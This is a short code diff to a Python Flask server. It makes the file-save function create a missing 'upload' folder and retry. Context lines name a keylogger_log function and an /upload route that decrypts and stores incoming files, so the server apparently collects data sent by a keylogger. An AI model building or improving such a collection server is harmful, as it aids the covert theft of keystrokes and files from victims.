@@ -85,8 +85,12 @@ def keylogger_log(message:str):
 def file_save(enc, fname):
     file = file_decryptor(enc)
 
-    with open(os.path.join('upload', fname), 'wb') as f:
-        f.write(file)
+    try:
+        with open(os.path.join('upload', fname), 'wb') as f:
+            f.write(file)
+    except FileNotFoundError:
+        os.mkdir("./upload")
+        file_save(enc, fname)
 
 @app.route('/upload', methods=['POST'])
 def upload_file():
